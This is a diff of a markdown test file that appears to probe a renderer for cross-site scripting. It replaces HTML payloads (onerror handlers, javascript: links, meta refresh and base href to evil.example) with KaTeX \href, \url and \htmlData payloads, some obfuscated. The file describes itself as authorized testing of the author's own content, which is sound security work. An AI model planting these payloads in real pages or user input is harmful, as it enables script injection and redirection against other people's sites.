@@ -1,64 +1,42 @@
-# batch2 (sections 26-40)
+# KaTeX math-renderer probe — g5 (own content, authorized)
 
-## 26. table with background attr
-<table background="javascript:alert(32)"><tr><td>x</td></tr></table>
+## m1
+$$\href{javascript:document.title='M1-RAN'}{M1}$$
 
+## m2
+$$\href{javascript:alert(1)}{M2}$$
 
-## 27. base href
-<base href="https://evil.example/">
+## m3
+$$\htmlClass{onload=document.title='M3-RAN'}{M3}$$
 
+## m4
+$$\htmlData{onload='document.title=M4'}{M4}$$
 
-## 28. link rel stylesheet
-<link rel="stylesheet" href="data:text/css,body{background:url(https://evil.example/)}">
+## m5
+$$\htmlId{zzz}{M5}$$
 
+## m6
+$$\cssId{yyy}{M6}$$
 
-## 29. meta refresh
-<meta http-equiv="refresh" content="0;url=https://evil.example/">
+## m7
+$$\href{data:text/html,<img src=x onerror=alert(1)>}{M7}$$
 
+## m8
+$$M8_{ \htmlClass{x}{y} }$$
 
-## 30. svg nested in markdown fence
-```html
-<img src=x onerror=alert(33)>
-```
+## m9
+$$\url{javascript:document.title='M9-RAN'}$$
 
+## m10
+$$\href{java\script:document.title='M10-RAN'}{M10}$$
 
-## 31. anchors with target and rel
-<a target="_blank" href="https://example.com">newtab</a>
+## m11
+$$\href{javascript&#x3a;document.title='M11-RAN'}{M11}$$
 
+## m12
+$$\includegraphics{https://example.com/x.png}$$
 
-## 32. img srcset
-<img srcset="x 1x, y 2x" onerror="alert(34)">
+## m13
+$$\textcolor{red}{\htmlData{onload="document.title='M13'"}{X}}$$
 
-
-## 33. picture/source
-<picture><source srcset="x" onerror="alert(35)"><img src=x onerror="alert(36)"></picture>
-
-
-## 34. audio / track
-<audio src=x onerror="alert(37)"></audio>
-
-
-## 35. iframe with srcdoc entity-encoded
-<iframe srcdoc="&lt;script&gt;alert(38)&lt;/script&gt;"></iframe>
-
-
-## 36. division with xml namespace
-<div xmlns="http://www.w3.org/1999/xhtml" onmouseover="alert(39)">x</div>
-
-
-## 37. closed-style img with space in tag
-< img src=x onerror=alert(40)>
-
-
-## 38. backtick code block with html
-`<script>alert(41)</script>`
-
-
-## 39. reference link js
-[ref][1]
-
-[1]: javascript:alert(42)
-
-
-## 40. heading with js id anchor
-## <a id="x" href="javascript:alert(43)">head</a>
+## END
